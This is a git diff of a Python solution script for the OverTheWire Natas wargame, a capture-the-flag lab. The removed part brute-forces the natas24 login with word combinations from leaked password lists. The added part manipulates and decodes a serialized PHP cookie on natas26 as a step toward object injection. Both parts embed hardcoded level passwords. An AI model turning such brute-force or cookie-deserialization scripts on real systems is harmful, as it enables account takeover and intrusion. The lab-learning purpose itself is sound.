@@ -1,40 +1,33 @@
-import requests, itertools
+import requests
 from requests.auth import HTTPBasicAuth
 
-comb = itertools.combinations_with_replacement
-perm = itertools.permutations
+# Just for a nicer output
+from phpserialize import loads
 
-uri = 'http://natas24.natas.labs.overthewire.org/'
+uri = 'http://natas26.natas.labs.overthewire.org/'
 
-f = open('passwords/darkweb2017-top10000.txt')
-darkweb = (line.rstrip('\n') for line in f)
-f = open('passwords/twitter-banned.txt')
-twitter = (line.rstrip('\n') for line in f)
-natas = ('natas'+str(i) for i in range(33))
-nrs = (str(i) for i in range(33))
+payload = {'x1' : '10', 'y1' : '10', 'x2' : '140', 'y2' : '140'}
+p = requests.get(uri,
+    auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
+    cookies={'PHPSESSID' : 'umphack'},
+    params = payload)
+payload = {'x1' : '150', 'y1' : '150', 'x2' : '10', 'y2' : '10'}
+p = requests.get(uri,
+    auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
+    cookies={'PHPSESSID' : 'umphack',
+             'drawing': p.cookies['drawing']},
+    params = payload)
+payload = {'x1' : '5', 'y1' : '10', 'x2' : '10', 'y2' : '20'}
+p = requests.get(uri,
+    auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
+    cookies={'PHPSESSID' : 'umphack',
+             'drawing': p.cookies['drawing']},
+    params = payload)
+print( loads(p.cookies['drawing'].decode('base64')) )
+# print( loads(p.cookies['drawing'].decode('base64')) )
 
-contains = 'iloveyou'
-
-def reqpass( passwd ):
-    if len(passwd) > 20:
-        return
-    else:
-        print( passwd )
-        p = requests.post( uri,
-            auth=HTTPBasicAuth('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg'),
-            data={'passwd' : passwd})
-        if 'Wrong!' not in p.text:
-            print( p.text )
-            return 1
-        return 0
-
-for passwds in [natas,nrs,twitter,darkweb]:
-    # for p in passwds:
-    #     if reqpass(p):
-    #         exit()
-    for p in comb( passwds, 2):
-        if reqpass(''.join(p)):
-            exit()
-    for p in comb( passwds, 3 ):
-        if reqpass(''.join(p)):
-            exit()
+# g = requests.get(uri,
+#     auth=HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'),
+#     cookies={'PHPSESSID' : 'umphack'},
+#     data = Data)
+# print( g.text )
